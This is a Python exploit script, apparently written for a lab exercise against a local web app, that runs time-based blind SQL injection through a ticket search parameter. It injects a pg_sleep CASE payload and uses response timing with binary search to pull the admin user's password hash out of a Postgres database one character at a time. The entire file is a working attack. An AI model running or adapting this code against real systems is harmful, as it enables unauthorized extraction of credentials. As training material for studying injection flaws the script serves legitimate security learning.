#!/usr/bin/env python3
"""
Objective 5 - time-based blind extraction of the admin password hash.

The page looks identical no matter what, so we can't read anything off it.
Instead we make Postgres pause when our guess is right and time the response.

Approach: binary search on each character's ASCII value (like obj4), but the
answer comes from the clock, not the page. For each yes/no question we run the
request; if it comes back slow, the answer is "true".

Payload shape (always returns the same page, only the timing changes):
    qqzz404' OR 1=(SELECT CASE WHEN (<condition>) THEN (SELECT 1 FROM pg_sleep(<SLEEP>)) ELSE 1 END)-- -
Note: we use OR (not AND) so the sleep is still evaluated even though the base
term matches no ticket. With AND, Postgres short-circuits and never sleeps.

Usage:
    python3 obj5_time_binary.py --cookie <sessionid>
    python3 obj5_time_binary.py --cookie <sessionid> --sleep 4
"""

import argparse
import statistics
import sys
import time
import requests

BASE_TERM = "qqzz404"
SECRET = "(SELECT password FROM auth_user WHERE username='admin')"

session = requests.Session()


def slow(sql_condition, url, sleep_s):
    """
    Run the timed payload. Take the median of two tries so one random
    lag spike doesn't flip the answer. TRUE if the median beats half
    the sleep time.
    """
    payload = (f"{BASE_TERM}' OR 1=(SELECT CASE WHEN ({sql_condition}) "
               f"THEN (SELECT 1 FROM pg_sleep({sleep_s})) ELSE 1 END)-- -")
    samples = []
    for _ in range(2):
        t0 = time.time()
        session.get(f"{url}/tickets/search/", params={"q": payload}, timeout=sleep_s + 20)
        samples.append(time.time() - t0)
    return statistics.median(samples) > (sleep_s / 2)


def find_length(url, sleep_s, cap=200):
    lo, hi = 0, cap
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if slow(f"LENGTH({SECRET}) >= {mid}", url, sleep_s):
            lo = mid
        else:
            hi = mid - 1
    return lo


def find_char(pos, url, sleep_s):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        if slow(f"ASCII(SUBSTRING({SECRET},{pos},1)) > {mid}", url, sleep_s):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cookie", required=True, help="value of the sessionid cookie")
    ap.add_argument("--url", default="http://127.0.0.1:5001", help="base URL of the app")
    ap.add_argument("--sleep", type=float, default=4.0, help="seconds to sleep on a TRUE answer")
    args = ap.parse_args()

    session.cookies.set("sessionid", args.cookie)

    if not slow(f"ASCII(SUBSTRING({SECRET},1,1)) = 112", args.url, args.sleep):  # 'p'
        sys.exit("[!] timing oracle failed - check the cookie or raise --sleep")
    print("[+] timing oracle works (char 1 is 'p')")

    n = find_length(args.url, args.sleep)
    print(f"[+] hash length = {n}")

    out = ""
    for pos in range(1, n + 1):
        out += find_char(pos, args.url, args.sleep)
        print(f"  {pos:>3}/{n}  {out}")

    print("\n[+] admin hash (via timing):")
    print(out)


if __name__ == "__main__":
    main()
